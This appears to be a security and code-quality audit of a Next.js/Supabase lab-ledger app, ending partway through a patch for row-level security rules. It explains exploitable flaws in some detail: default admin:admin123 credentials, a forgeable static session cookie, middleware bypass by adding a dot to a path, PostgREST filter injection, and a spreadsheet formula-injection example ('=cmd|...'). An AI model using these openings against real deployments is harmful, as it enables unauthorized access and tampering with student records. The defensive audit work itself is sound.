- **Vulnerable**: Contains exploitable security weaknesses (CWE / OWASP).
- **Broken**: Functional logic failure, data loss bug, or syntax/runtime crash.

```
Total Files Audited: 47
├── Healthy:          12 files (25.5%)
├── Needs Attention:  18 files (38.3%)
├── Vulnerable:       11 files (23.4%)
└── Broken:            6 files (12.8%)
```

---

### 4.1 Root Configuration, Environment & Hygiene (15 Files)

#### 1. `.env.local`
- **Lines**: 15 | **Verdict**: **Vulnerable** (SEC-08, SEC-14)
- **Purpose**: Local runtime environment secrets.
- **Specific Findings**: Exposes live Supabase service role key (`SUPABASE_SERVICE_ROLE_KEY`), Google Gemini API key (`GEMINI_API_KEY`), and default admin credentials `admin:admin123`. `CRON_SECRET=` is blank, breaking Vercel automated backup execution.
- **Action**: Rotate all exposed API keys. Populate `CRON_SECRET` with a 256-bit cryptographically secure token. Remove plaintext admin credentials.

#### 2. `.env.local.example`
- **Lines**: 11 | **Verdict**: **Needs Attention**
- **Purpose**: Template environment configuration for developers.
- **Specific Findings**: Omits documentation for `LAB_ADMIN_USERNAME`, `LAB_ADMIN_PASSWORD`, and `SESSION_SECRET`.
- **Action**: Add variable definitions with dummy placeholders.

#### 3. `.gitignore`
- **Lines**: 35 | **Verdict**: **Needs Attention**
- **Purpose**: Git version control ignore rules.
- **Specific Findings**: Ignores `.env*.local`, `node_modules`, and `.next`. Does not ignore `powershell.exe` or standalone `.xlsx`/`.pdf` exports generated during testing.
- **Action**: Add `*.exe`, `*.xlsx`, `*.pdf` to gitignore rules.

#### 4. `ORIGINAL_REQUEST.md`
- **Lines**: 49 | **Verdict**: **Healthy**
- **Purpose**: Authoritative audit scope and project specifications.
- **Specific Findings**: Unmodified specification document.

#### 5. `middleware.ts`
- **Lines**: 49 | **Verdict**: **Vulnerable** (SEC-02, SEC-04)
- **Purpose**: Next.js edge route protection and session verification.
- **Specific Findings**:
  - Line 2: Imports `createMiddlewareClient` from `@/lib/supabase-middleware` but never executes it (dead code).
  - Line 5: Allows `/api/backup` in `publicRoutes` without validating authorization tokens.
  - Line 22: `pathname.includes('.')` permits complete authentication bypass for any request containing a dot.
  - Line 29: Verifies authentication by checking if cookie `lab_auth_session` equals literal `'authenticated'`.
  - Line 32: Unauthenticated API requests receive HTTP 307 redirects to `/login` HTML instead of HTTP 401 JSON.
- **Action**: Implement cryptographic HMAC token verification, remove `pathname.includes('.')`, and return 401 JSON for `/api/*` routes.

#### 6. `next-env.d.ts`
- **Lines**: 6 | **Verdict**: **Healthy**
- **Purpose**: Next.js TypeScript declarations.
- **Specific Findings**: Standard Next.js auto-generated type references.

#### 7. `next.config.js`
- **Lines**: 15 | **Verdict**: **Needs Attention** (SEC-12)
- **Purpose**: Next.js runtime configuration.
- **Specific Findings**:
  - Defines `images.remotePatterns` for `*.supabase.co`.
  - Missing all standard HTTP security headers: `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, and `Content-Security-Policy`.
- **Action**: Configure `headers()` async hook returning comprehensive security headers.

#### 8. `package-lock.json`
- **Lines**: 7,349 | **Verdict**: **Vulnerable** (OBS-03)
- **Purpose**: Dependency lockfile.
- **Specific Findings**: Locks `xlsx@^0.18.5` which contains known unpatched prototype pollution and ReDoS vulnerabilities (CVE-2023-30533).

#### 9. `package.json`
- **Lines**: 37 | **Verdict**: **Needs Attention** (OBS-03)
- **Purpose**: Manifest defining dependencies and build scripts.
- **Specific Findings**:
  - Dependencies: `@google/generative-ai` (^0.21.0) is installed but never imported anywhere.
  - `xlsx` (^0.18.5) is deprecated and unmaintained on npm.
  - Scripts: `next dev -H 0.0.0.0` binds dev server to all network interfaces.
- **Action**: Prune `@google/generative-ai`; migrate from deprecated `xlsx` to secure Excel generators (e.g. `exceljs`).

#### 10. `postcss.config.js`
- **Lines**: 7 | **Verdict**: **Healthy**
- **Purpose**: PostCSS plugin configuration for Tailwind and Autoprefixer.
- **Specific Findings**: Standard configuration.

#### 11. `powershell.exe`
- **Size**: 454,656 bytes | **Verdict**: **Vulnerable** (SEC-09)
- **Purpose**: Rogue Windows binary.
- **Specific Findings**: Binary executable committed in web project root. Exposes developers and automated build pipelines to binary search path hijacking (CWE-426).
- **Action**: Immediate deletion from git tracking and filesystem.

#### 12. `tailwind.config.js`
- **Lines**: 28 | **Verdict**: **Needs Attention** (OBS-01)
- **Purpose**: Tailwind CSS configuration (CommonJS).
- **Specific Findings**: Duplicate redundant file alongside `tailwind.config.ts`.
- **Action**: Delete `tailwind.config.js` and retain TypeScript variant.

#### 13. `tailwind.config.ts`
- **Lines**: 30 | **Verdict**: **Healthy**
- **Purpose**: Tailwind CSS configuration (TypeScript).
- **Specific Findings**: Clean type-safe theme extension definitions.

#### 14. `tsconfig.json`
- **Lines**: 41 | **Verdict**: **Healthy**
- **Purpose**: TypeScript compiler options.
- **Specific Findings**: Strict mode enabled (`"strict": true`), path aliases correctly configured (`@/*`).

#### 15. `vercel.json`
- **Lines**: 9 | **Verdict**: **Healthy**
- **Purpose**: Vercel Cron scheduled task configuration.
- **Specific Findings**: Configures weekly cron trigger for `/api/backup` every Monday at 03:00 UTC.

---

### 4.2 Application Routes & API Handlers (15 Files)

#### 16. `app/globals.css`
- **Lines**: 46 | **Verdict**: **Healthy**
- **Purpose**: Global CSS definitions and Tailwind utility directives.
- **Specific Findings**: Standard Tailwind CSS imports and custom root variables.

#### 17. `app/layout.tsx`
- **Lines**: 53 | **Verdict**: **Needs Attention**
- **Purpose**: Root application layout and PWA registration.
- **Specific Findings**:
  - Lines 38–48: Registers service worker via `dangerouslySetInnerHTML`.
  - Lacks React Error Boundary (`app/error.tsx` or `<ErrorBoundary>`) around main page children.
- **Action**: Add global error boundary and move service worker registration to an external client component.

#### 18. `app/not-found.tsx`
- **Lines**: 21 | **Verdict**: **Healthy**
- **Purpose**: Custom 404 error page.
- **Specific Findings**: Clean UI with navigational link back to dashboard.

#### 19. `app/page.tsx`
- **Lines**: 79 | **Verdict**: **Healthy**
- **Purpose**: Public marketing / landing page.
- **Specific Findings**: Clean promotional UI with direct links to `/sessions` and `/login`.

#### 20. `app/api/auth/login/route.ts`
- **Lines**: 38 | **Verdict**: **Vulnerable** (SEC-02, SEC-08)
- **Purpose**: Faculty authentication endpoint.
- **Specific Findings**:
  - Lines 7–8: Fallback default credentials `admin:admin123`.
  - Line 14: Non-constant-time password equality check (`===`).
  - Lines 17–23: Sets static unencrypted session cookie `lab_auth_session=authenticated` with 30-day lifetime.
  - Missing rate limiting: Vulnerable to brute-force credential stuffing.
- **Action**: Replace with constant-time HMAC authentication and IP rate-limiting.

#### 21. `app/api/auth/logout/route.ts`
- **Lines**: 14 | **Verdict**: **Needs Attention**
- **Purpose**: Faculty logout endpoint.
- **Specific Findings**: Clears cookie on client side via `maxAge: 0`. Cannot invalidate token on server because tokens are stateless and unsigned.
- **Action**: Implement token invalidation table or short-lived token rotation.

#### 22. `app/api/backup/route.ts`
- **Lines**: 209 | **Verdict**: **Vulnerable** (SEC-05, SEC-06, OBS-19)
- **Purpose**: Weekly Vercel cron automated Excel backup generator and photo pruning.
- **Specific Findings**:
  - Lines 14–17: Rejects request if `CRON_SECRET` is unset; `.env.local` leaves it blank.
  - Lines 84–91: Direct injection of student names and remarks into Excel cells (Formula Injection).
  - Lines 108–109: Sheet names formatted as `${session_date}_${section}` without character escaping (`[\/:*?[\]]`); duplicate section sessions crash SheetJS with unhandled duplicate sheet exceptions.
  - Lines 120–135: Uploads unencrypted backup workbook to public bucket `session-photos` and leaks public URL.
- **Action**: Sanitize cell strings with single quote `'`; deduplicate sheet names; store backups in private bucket with signed URLs.

#### 23. `app/api/ocr/route.ts`
- **Lines**: 197 | **Verdict**: **Broken / Vulnerable** (SEC-03, SEC-07, OBS-09)
- **Purpose**: Photo OCR extraction pipeline via Google Gemini.
- **Specific Findings**:
  - Line 8: Zero authentication or authorization check.
  - Lines 38–48: Concurrently calls Gemini for all photos without concurrency control or rate limits.
  - Lines 113–122: Creates `lab_sessions` record before inserting entries; insert failure leaves orphaned ghost sessions.
  - Lines 128–135: Accepts unvalidated `photo.mimeType` and uses `split('/')[1]` for storage path, enabling path traversal.
  - **Lines 163–165 (CRITICAL LOGIC FLAW)**: Hardcodes `student_id: null`, `matched: true`, `ocr_confidence: 1.0` for all entries! Roster matching is never executed. Returns fake `matchedEntries: entriesToInsert.length`.
- **Action**: Authenticate route, throttle Gemini API calls, validate image magic bytes, and integrate real fuzzy matching via `lib/matching.ts`.

#### 24. `app/dashboard/page.tsx`
- **Lines**: 1159 | **Verdict**: **Vulnerable / Broken** (SEC-10, OBS-22, OBS-23, OBS-24)
- **Purpose**: Analytics dashboard, hardware tracking, student search, and session history.
- **Specific Findings**:
  - Lines 111–134: Downloads the entire `lab_entries` table twice on page load for client-side metric aggregation.
  - Line 272: Direct interpolation of query into PostgREST filter `.or(...)` allows filter injection.
  - Lines 1034–1037: Keystroke search triggers unthrottled API requests; responses arriving out of order overwrite newer search state.
  - Lines 177–183: Reports "100% Signed" on an empty database.
  - Student history search fails because `student_id` is always `null` in `lab_entries`.
- **Action**: Replace client-side table scans with PostgreSQL server RPCs; add 300ms debounce and sanitization to search.

#### 25. `app/export/page.tsx`
- **Lines**: 316 | **Verdict**: **Needs Attention**
- **Purpose**: Date-range filtering and batch export interface (Excel & PDF).
- **Specific Findings**:
  - Lines 93–102: Executes N+1 parallel database queries to fetch entries for every session in range.
  - Lines 128–133: Assembles multi-session PDF on the main UI thread, freezing browser tabs on large date ranges.
  - Line 136: Calls `URL.revokeObjectURL(url)` synchronously immediately after `link.click()`, causing file download aborts in Firefox.
- **Action**: Batch fetch entries using `.in('session_id', ids)`; offload PDF generation or use Web Workers; defer `revokeObjectURL` with `setTimeout(..., 1000)`.

#### 26. `app/login/page.tsx`
- **Lines**: 162 | **Verdict**: **Vulnerable** (SEC-11)
- **Purpose**: Faculty login user interface.
- **Specific Findings**:
  - Line 12 & Line 43: Unvalidated `redirect` query parameter passed directly to `router.push()`, creating an open redirect vulnerability.
- **Action**: Enforce relative URL validation on `redirect`.

#### 27. `app/roster/page.tsx`
- **Lines**: 7 | **Verdict**: **Broken** (OBS-25)
- **Purpose**: Student roster management route.
- **Specific Findings**: Stub file containing only `redirect('/sessions')`. Renders no UI and prevents faculty from viewing or uploading student rosters.
- **Action**: Render the existing `components/RosterUpload.tsx` component.

#### 28. `app/sessions/page.tsx`
- **Lines**: 119 | **Verdict**: **Needs Attention**
- **Purpose**: Paginated session index list.
- **Specific Findings**:
  - Lines 19–25: Queries all sessions without server-side pagination (`.range(from, to)`).
  - Swallows Supabase query errors silently, rendering an empty session list on database failures.
- **Action**: Add server-side pagination and toast error notifications.

#### 29. `app/sessions/new/page.tsx`
- **Lines**: 459 | **Verdict**: **Needs Attention** (OBS-16)
- **Purpose**: Session creation form (OCR upload and manual entry modes).
- **Specific Findings**:
  - Lines 96–128: Inserts `lab_sessions` then `lab_entries`. If entry insertion fails, the session record remains as an orphaned ghost session.
  - No duplicate session guard: Rapid double-clicking creates duplicate sessions.
  - Lines 354–429: Duplicates table rendering logic rather than reusing `SessionTable.tsx`.
- **Action**: Wrap multi-table inserts in transactional rollback or server action; disable submit button while loading.

#### 30. `app/sessions/[id]/page.tsx`
- **Lines**: 420 | **Verdict**: **Broken** (OBS-14, OBS-15)
- **Purpose**: Detailed session review table, photo preview, and confirmation page.
- **Specific Findings**:
  - **Lines 76–138 (CRITICAL DATA LOSS DEFECT)**: `handleSaveEntries` updates modified entries and inserts new entries, but **never executes a SQL `DELETE` for removed entries**. Deleting rows in the UI is cosmetic; upon page reload, deleted entries resurrect!
  - Lines 96–112: Updates modified entries using unbounded `Promise.all` with individual HTTP PATCH calls without transactional rollback.
  - Line 157: `handleConfirm` ignores errors from `handleSaveEntries()` and permanently locks a half-saved session.
  - Line 211: Calls `SessionPdfDocument({...})` as a regular function rather than a JSX element (`<SessionPdfDocument ... />`), causing context failures in React 19.
- **Action**: Track deleted entry IDs and issue `supabase.from('lab_entries').delete().in('id', deletedIds)`; render PDF document as proper React element.

---

### 4.3 UI & Domain Components (4 Files)

#### 31. `components/Navbar.tsx`
- **Lines**: 137 | **Verdict**: **Needs Attention**
- **Purpose**: Global top navigation bar and mobile drawer.
- **Specific Findings**:
  - Lines 7–8: Unused dead imports `createBrowserClient` and `Users`.
  - Lines 22–31: Logout handler catches network errors and logs them to console without notifying the user.
  - Navigation links do not include `/roster`.
- **Action**: Clean up unused imports; display error toast if logout fails; add roster link.

#### 32. `components/PhotoUpload.tsx`
- **Lines**: 147 | **Verdict**: **Needs Attention** (OBS-17)
- **Purpose**: Photo drag-and-drop dropzone with camera capture.
- **Specific Findings**:
  - Line 4: Unused import `GripVertical`.
  - Line 29: Calls `URL.createObjectURL(file)` to generate thumbnail previews, but **never calls `URL.revokeObjectURL()`** on removal or unmount, creating high heap memory leaks on mobile devices.
  - Lines 97, 105: Input element `.value` is not reset, preventing selection of the same file after deletion.
- **Action**: Add `useEffect` cleanup hook to revoke object URLs; reset file input value.

#### 33. `components/RosterUpload.tsx`
- **Lines**: 245 | **Verdict**: **Needs Attention** (OBS-25)
- **Purpose**: Student roster CSV and Excel parser with Supabase upsert.
- **Specific Findings**:
  - Completely orphaned: Never imported or rendered anywhere in the application.
  - Line 42: Dynamic `import('xlsx')` lacks error rejection handling.
  - Line 46: `workbook.Sheets[workbook.SheetNames[0]]` crashes if uploaded Excel file has 0 sheets.
- **Action**: Wire component into `app/roster/page.tsx` and add sheet existence guards.

#### 34. `components/SessionTable.tsx`
- **Lines**: 248 | **Verdict**: **Broken / Vulnerable** (OBS-12, OBS-13)
- **Purpose**: Editable data grid for review and manual session entry.
- **Specific Findings**:
  - **Lines 45–62 (FALSE AUTO-SAVE)**: Changes are debounced by 200ms and emitted only to parent React state (`onEntriesChange`). **No auto-save to the database exists**. Closing or refreshing the page discards all edits.
  - **Lines 58–89 (DEBOUNCE RACE CONDITION)**: `addRow` and `deleteEntry` immediately call `notifyParent(updated)` without clearing `debounceTimerRef.current`. If a user types in a cell and immediately deletes a row, the 200ms timer fires from the prior closure and overwrites the parent state with the pre-deletion list!
  - Line 108: Row `key={entry.id || idx}`. New rows use `id: temp-${Date.now()}`. Adding multiple rows rapidly creates duplicate React keys, causing state crossover.
- **Action**: Clear pending timers on add/delete; use `crypto.randomUUID()` for temporary keys; implement real background auto-save.

---

### 4.4 Utility Libraries & Database Clients (7 Files)

#### 35. `lib/export-excel.ts`
- **Lines**: 110 | **Verdict**: **Vulnerable** (SEC-05)
- **Purpose**: Single and multi-session Excel generation via SheetJS.
- **Specific Findings**:
  - Lines 27–34: Unsanitized student names, roll numbers, and remarks inserted into cells (Formula Injection / CWE-1236).
  - Line 77: Sheet name `${session_date}_${session.section || 'all'}` is not sanitized against forbidden Excel characters (`\`, `/`, `?`, `*`, `[`, `]`, `:`).
- **Action**: Prepend single quote `'` to strings starting with formula trigger characters; sanitize sheet names.

#### 36. `lib/export-pdf.tsx`
- **Lines**: 351 | **Verdict**: **Broken / Needs Attention** (OBS-21)
- **Purpose**: PDF layout generation via `@react-pdf/renderer`.
- **Specific Findings**:
  - Lines 145, 256: Tables are rendered inside a single `<Page>` without row wrap calculations. Sessions with >30 rows overflow off the bottom of the page or collide with the fixed footer.
  - Institutional branding conflict: Header displays `VIMTECH` (Lines 153, 264) while footer displays `Lab Ledger — VG College` (Lines 227, 338).
- **Action**: Implement table pagination with repeated headers; harmonize institutional branding.

#### 37. `lib/gemini.ts`
- **Lines**: 140 | **Verdict**: **Needs Attention** (OBS-10)
- **Purpose**: Google Gemini REST client with model fallback.
- **Specific Findings**:
  - Line 42: `FALLBACK_MODELS` includes non-existent model name `'gemini-3.6-flash'`.
  - Line 61: 45-second timeout per model across 5 fallbacks can block execution for 225 seconds, exceeding Vercel serverless execution limits.
  - Line 61: `timeoutId` is not cleared inside a `finally` block, leaving dangling timers on fetch failure.
  - Lines 122–126: `JSON.parse(jsonStr) as OcrResult` lacks runtime schema validation.
- **Action**: Clean fallback model list to valid GA models; clear timeouts in `finally`; validate parsed JSON with Zod.

#### 38. `lib/matching.ts`
- **Lines**: 113 | **Verdict**: **Needs Attention** (SEC-13)
- **Purpose**: Fuzzy string matching algorithms and Supabase RPC match invocations.
- **Specific Findings**:
  - Line 1: Imports `createServerClient` from `./supabase`, which depends on `SUPABASE_SERVICE_ROLE_KEY`. If imported in client components, it exposes server secrets or fails.
  - Line 88: `Math.max(nameSim, ucmsSim)` takes maximum instead of a weighted confidence score, leading to false positives on short names.
  - Roster matching logic in this file is completely bypassed by `app/api/ocr/route.ts`.
- **Action**: Mark file server-only (`import 'server-only'`); use weighted matching score; connect to OCR route.

#### 39. `lib/supabase-middleware.ts`
- **Lines**: 30 | **Verdict**: **Needs Attention** (OBS-06)
- **Purpose**: Supabase SSR cookie handler for Edge middleware.
- **Specific Findings**: Completely unreferenced dead code. Never invoked by `middleware.ts`.
- **Action**: Integrate into `middleware.ts` or delete.

#### 40. `lib/supabase.ts`
- **Lines**: 18 | **Verdict**: **Vulnerable** (SEC-01)
- **Purpose**: Supabase client factories for browser (anon) and server (service_role).
- **Specific Findings**:
  - Lines 5–9: `createBrowserClient()` creates a new Supabase client on every call instead of reusing a singleton.
  - Combined with permissive RLS policies, this client exposes the database to full anonymous manipulation.
- **Action**: Implement client singleton; enforce strict RLS in Supabase.

#### 41. `lib/types.ts`
- **Lines**: 93 | **Verdict**: **Healthy**
- **Purpose**: TypeScript domain interfaces for database entities and OCR payloads.
- **Specific Findings**: Clean TypeScript interface definitions for `Student`, `LabSession`, `SessionPhoto`, `LabEntry`, `OcrResult`, and `MatchResult`.

---

### 4.5 Public Static Assets & Service Worker (3 Files)

#### 42. `public/logo.png`
- **Size**: 73,083 bytes | **Verdict**: **Healthy**
- **Purpose**: College institutional logo asset.
- **Specific Findings**: Valid binary PNG image.

#### 43. `public/manifest.json`
- **Lines**: 19 | **Verdict**: **Healthy**
- **Purpose**: Progressive Web App (PWA) manifest.
- **Specific Findings**: Valid PWA configuration with application name, colors, and icon definitions.

#### 44. `public/sw.js`
- **Lines**: 64 | **Verdict**: **Healthy**
- **Purpose**: Service worker for offline asset caching.
- **Specific Findings**: Implements cache-first strategy for static assets while correctly bypassing `/api/` and Supabase cloud domains.

---

### 4.6 Database DDL Schemas & RLS Migration Scripts (3 Files)

#### 45. `supabase/rls-policies.sql`
- **Lines**: 48 | **Verdict**: **Vulnerable** (SEC-01)
- **Purpose**: Row-Level Security policy migration script.
- **Specific Findings**:
  - Lines 44–47: `create policy ... for all using (true) with check (true)` completely neutralizes access control across all 4 database tables, allowing public internet users to delete or modify all records.
- **Action**: Replace with authenticated role-based policies and server-side mutations.

#### 46. `supabase/schema-v2.sql`
- **Lines**: 71 | **Verdict**: **Needs Attention**
- **Purpose**: Advanced database RPCs for hardware auditing, student history, and photo retention.
- **Specific Findings**:
  - Functions declared in `public` schema without revoking execute permissions from `anon`.
  - `student_history` RPC is dysfunctional in practice because `lab_entries.student_id` is always `null`.
- **Action**: Revoke execute permissions from `anon`; populate foreign keys during OCR ingestion.

#### 47. `supabase/schema.sql`
- **Lines**: 75 | **Verdict**: **Needs Attention**
- **Purpose**: Base database DDL definitions, trigram extensions, and index creation.
- **Specific Findings**:
  - Defines `pg_trgm` GIN indexes on `students(name)` and `students(ucms_no)`.
  - Implements `match_student` RPC with similarity thresholds.
  - Foreign key on `lab_entries(student_id)` is nullable and never populated by application flows.
- **Action**: Add unique index on `(session_date, section, class_name)` in `lab_sessions` to prevent duplicate sessions.

---

## 5. End-to-End User Flow Health Analysis

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        USER FLOW AUDIT VERDICT SUMMARY                                 │
├──────────────────────────────────────────────────────┬─────────────────────────────────┤
│ Flow 1: Faculty Login & Authentication              │ ⚠️ HIGH RISK (Static Cookie)    │
│ Flow 2: OCR Extraction & Gemini Ingestion           │ ❌ BROKEN (Fake Roster Matching)│
│ Flow 3: Session Review Table & Auto-Save            │ ❌ BROKEN (Rows Cannot Delete)  │
│ Flow 4: Manual Session Creation                     │ ⚠️ UNSTABLE (Ghost Sessions)    │
│ Flow 5: PDF Ledger Export                           │ ⚠️ DEFECTIVE (Table Truncation) │
│ Flow 6: Excel Ledger Export & Backup                │ ❌ VULNERABLE (Formula Injection│
│ Flow 7: Dashboard Analytics & Search                │ ⚠️ DEFECTIVE (Client DB Scans)  │
└──────────────────────────────────────────────────────┴─────────────────────────────────┘
```

---

### 5.1 Flow 1: Faculty Authentication & Session Lifecycle
**User Intent**: Faculty member navigates to `/login`, submits administrative credentials, receives secure session token, and accesses ledger management routes.

```
[Browser /login] ──POST /api/auth/login──► [Check Expected Env Vars]
       │                                            │ (Matches admin:admin123)
       │                                            ▼
       │                                    [Set Cookie: 'authenticated']
       │                                            │
       ▼                                            ▼
[router.push(redirect)] ◄───────────────────────────┘
```

**Step-by-Step Execution Breakdown & Defects**:
1. Faculty enters username and password in `app/login/page.tsx`.
2. Form submits to `POST /api/auth/login`. Handler checks credentials against `LAB_ADMIN_USERNAME` and `LAB_ADMIN_PASSWORD` (falling back to hardcoded `admin:admin123` if unset). String comparison uses `===`, which is vulnerable to side-channel timing analysis (SEC-08).
3. On success, response sets cookie `lab_auth_session=authenticated` with 30-day expiry (SEC-02).
4. `app/login/page.tsx` reads `searchParams.get('redirect')` and executes `router.push(redirect)` without domain validation, creating an Open Redirect vulnerability (SEC-11).
5. On subsequent requests, `middleware.ts` checks `request.cookies.get('lab_auth_session')?.value !== 'authenticated'`. Because the cookie is static and unsigned, any user can forge it in DevTools. Furthermore, appending a dot (`.`) to any path bypasses the middleware completely (SEC-04).

---

### 5.2 Flow 2: OCR Photo Ingestion & The Artificial Roster Matching Flaw
**User Intent**: Faculty uploads photos of handwritten paper ledgers; the system extracts dates, sections, and student rows via Gemini AI, matches them against the student roster database, and displays confidence indicators.

```
[Upload Photos] ──► [Canvas Resize 1200px] ──► [POST /api/ocr]
                                                     │
                                        ┌────────────┴────────────┐
                                        ▼                         ▼
                               [Gemini REST API]         [Insert lab_sessions]
                               (5-Model Fallback)                 │
                                        │                         ▼
                                        ▼               [Upload Storage Photos]
                               [Parse JSON Regex]                 │
                                        │                         ▼
                                        └───────────► ❌ HARDCODED FAKE MATCH:
                                                      student_id: null
                                                      matched: true
                                                      ocr_confidence: 1.0
```

**Step-by-Step Execution Breakdown & Defects**:
1. In `app/sessions/new/page.tsx`, faculty selects up to 5 photos. Client-side canvas shrinks photos to 1200px JPEG.
2. `POST /api/ocr` receives base64 photos without authentication (SEC-03).
3. Endpoint concurrently fires Gemini requests via `Promise.all`. If a model fails, it loops through 5 models including the non-existent `gemini-3.6-flash`.
4. Extracted rows are merged. `lab_sessions` is inserted first. Photos are uploaded to public bucket `session-photos` (SEC-06).
5. **The Artificial Matching Scandal (OBS-09)**: In `app/api/ocr/route.ts` lines 163–165:
   ```typescript
   student_id: null,
   matched: true,
   ocr_confidence: 1.0
   ```
   The backend completely skips roster matching (`lib/matching.ts` is never invoked). It marks every entry as `matched: true` with a fake 100% confidence (`1.0`) and leaves `student_id: null`.
6. The API returns `matchedEntries: entriesToInsert.length`. The frontend displays an erroneous toast: `Extracted X entries (X matched to roster)!`. Faculty are deceived into believing the roster was verified.

---

### 5.3 Flow 3: Session Review Table, Debounce Concurrency & Silent Deletion Bug
**User Intent**: Faculty reviews OCR-extracted student rows at `/sessions/[id]`, edits misspelled names or misread roll numbers, deletes invalid rows, adds missing students, and saves changes.

```
[SessionDetailPage] ──Load lab_entries──► [SessionTable.tsx]
         │                                       │
         │                                [Cell Edit: 200ms Debounce]
         │                                       │
         ▼                                       ▼
[Click "Save Changes"] ◄────────────────── [Local State Only!]
         │                                  (NO AUTO-SAVE TO DATABASE)
         ├──► Update Modified Rows
         ├──► Insert New Rows (temp-*)
         └──► ❌ SILENT BUG: Ignores Deleted Rows!
                     │
                     ▼
              [loadSession() Re-fetch]
                     │
                     ▼
       ❌ Deleted Rows Reappear on Screen!
```

**Step-by-Step Execution Breakdown & Defects**:
1. `app/sessions/[id]/page.tsx` loads session entries via `createBrowserClient()`.
2. Entries are passed to `components/SessionTable.tsx`.
3. **The False Auto-Save Flaw (OBS-12)**: When faculty edits a cell, `updateEntry` sets a 200ms debounce timer and calls `onEntriesChange(updated)`. This updates local React state only. There is **zero background network auto-save**. If faculty leaves the page, all edits are lost permanently.
4. **The Debounce Race Condition (OBS-13)**: If faculty types in a cell and immediately clicks "Add Row" or "Delete", `addRow` calls `notifyParent` immediately without clearing the pending 200ms timer. The leftover timer fires 150ms later with the old closure array, stomping the newly added row or restoring the deleted row.
5. **The Broken Row Deletion Defect (OBS-14)**: In `app/sessions/[id]/page.tsx` `handleSaveEntries`:
   ```typescript
   const existingEntries = entries.filter((e) => !e.id.startsWith('temp-'));
   const modifiedEntries = existingEntries.filter(...);
   await Promise.all(modifiedEntries.map(e => supabase.update(...)));
   await supabase.insert(newEntries);
   await loadSession(); // <── Re-fetches from DB!
   ```
   The function never computes deleted row IDs and never executes `supabase.from('lab_entries').delete()`.
6. When `loadSession()` re-queries Supabase, all deleted entries are re-fetched. Deleted entries magically reappear on the screen. It is impossible to delete entries.

---

### 5.4 Flow 4: Manual Session Creation & Orphaned Records
**User Intent**: Faculty manually creates a lab session without OCR by filling header details and inputting student entries.

**Step-by-Step Execution Breakdown & Defects**:
1. Faculty enters date, section, class, and manually adds rows in `app/sessions/new/page.tsx`.
2. Form submits:
   - Step 1: Inserts `lab_sessions` record via Supabase anon client.
   - Step 2: Maps entries with `student_id: null, matched: true, ocr_confidence: 1.0` (same fake matching defect).
   - Step 3: Inserts `lab_entries`.
3. **Orphaned Session Creation (OBS-16)**: If Step 3 fails (e.g. network disconnect or validation error), Step 1 is not rolled back. The database retains an empty "ghost session".
4. **Memory Leak in Photo Upload (OBS-17)**: If faculty switches between OCR and Manual modes, uploaded file thumbnails generated via `URL.createObjectURL(file)` in `components/PhotoUpload.tsx` are never revoked, causing memory exhaustion on low-end laptops and mobile tablets.

---

### 5.5 Flow 5: Client-Side PDF Generation & Institutional Identity Collision
**User Intent**: Faculty exports an official printable A4 PDF ledger for physical signing or departmental archiving.

**Step-by-Step Execution Breakdown & Defects**:
1. In `SessionDetailPage` or `ExportPage`, user clicks "Download PDF".
2. Application dynamically imports `@react-pdf/renderer` and fetches `/logo.png` as Base64.
3. `SessionPdfDocument` renders an A4 `<Page>`.
4. **Institutional Branding Contradiction (OBS-21)**:
   - Header (Line 153): `<Text style={styles.subtitle}>VIMTECH</Text>`
   - Footer (Line 227): `<Text>Lab Ledger — VG College</Text>`
   The generated official document asserts two completely different institutional names on the same page.
5. **Single-Page Overflow Clipping (OBS-21)**: The PDF layout does not calculate dynamic page splits. For sessions with typical lab sizes (40–60 students), table rows overflow off the bottom of the page and visually collide with the fixed absolute footer.
6. **React 19 Rendering Glitch**: In `app/sessions/[id]/page.tsx` line 211, `SessionPdfDocument({...})` is invoked as a direct JavaScript function call rather than a React JSX element (`<SessionPdfDocument ... />`), causing context lifecycle warnings.

---

### 5.6 Flow 6: Spreadsheet Export, SheetJS Vulnerabilities & Backup Cron Failure
**User Intent**: Faculty exports session data to Excel for grading or departmental spreadsheets; automated weekly cron backs up recent sessions.

**Step-by-Step Execution Breakdown & Defects**:
1. User clicks "Export to Excel" or Vercel Cron triggers `GET /api/backup`.
2. Application invokes `generateSessionExcel` from `lib/export-excel.ts` or `app/api/backup/route.ts`.
3. **Formula Injection (SEC-05)**: Raw student names and remarks are written directly into worksheet cells. Formulas like `=HYPERLINK(...)` or `=cmd|...` execute when opened by administrators.
4. **Sheet Name Collision Crash (OBS-19)**: In `app/api/backup/route.ts` line 108:
   `const sheetName = `${session.session_date}_${session.section || 'all'}`.substring(0, 31);`
   SheetJS throws an unhandled fatal error if two sessions share the same date and section, aborting the entire weekly backup.
5. **Public Data Exposure (SEC-06)**: Backups are uploaded to the public `session-photos` bucket, exposing all institutional student records.

---

### 5.7 Flow 7: Administrative Dashboard Analytics & Client-Side Database Flooding
**User Intent**: Department head opens `/dashboard` to monitor lab occupancy, student attendance counts, peripheral fault frequencies (mouse/keyboard/monitor), and student history.

**Step-by-Step Execution Breakdown & Defects**:
1. In `app/dashboard/page.tsx`, `loadOverview()` executes on mount.
2. **Catastrophic Database Scan (OBS-22)**: The client browser dispatches two concurrent queries downloading the entire `lab_entries` table into browser RAM:
   - Query 1: `supabase.from('lab_entries').select('raw_ucms_ocr, raw_name_ocr')`
   - Query 2: `supabase.from('lab_entries').select('session_id, signature_present, remarks')`
   In a production college ledger with 10,000+ entries, this downloads megabytes of raw JSON, freezing mobile browsers and consuming excessive Supabase bandwidth.
3. **PostgREST Filter Injection (SEC-10)**: In `searchStudentsForHistory`, typing commas into the search input escapes the `.or(...)` filter syntax.
4. **Keystroke Race Conditions (OBS-23)**: Search input has no debounce. Every keypress fires an API request; responses arriving out of order overwrite the latest search results.
5. **False Compliance Indicator (OBS-24)**: On a newly initialized database with 0 entries, `totalSignatures === 0`, causing the dashboard to display "100% Signed" on an empty ledger.

---

## 6. Concrete Remediation Guidelines & Production-Ready Code Patches

Below are drop-in, production-ready secure code replacements for the affected files.

---

### 6.1 Patch 1: Hardened Supabase Row-Level Security Policies (`supabase/rls-policies.sql`)

**Rationale**: Revokes all blanket public access. Restricts read access strictly to authenticated faculty users. Revokes anonymous direct execution of stored procedures.

```sql
-- ==============================================================================
-- SECURE ROW LEVEL SECURITY REPLACEMENT POLICIES
-- Target File: supabase/rls-policies.sql
-- ==============================================================================

-- 1. Ensure RLS is active on all core ledger tables
ALTER TABLE students ENABLE ROW LEVEL SECURITY;
ALTER TABLE lab_sessions ENABLE ROW LEVEL SECURITY;
